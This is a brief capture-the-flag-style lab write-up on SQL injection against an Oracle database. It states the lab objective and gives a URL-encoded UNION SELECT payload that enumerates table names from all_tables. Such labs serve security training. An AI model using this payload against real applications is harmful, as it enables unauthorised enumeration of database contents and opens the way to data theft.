# Lab: SQL injection attack, listing the database contents on Oracle

## Objective
Perform the attack to solve SQL injection attack, listing the database contents on Oracle.

## Payload
```text
'+UNION+SELECT+table_name,+NULL+FROM+all_tables--
```
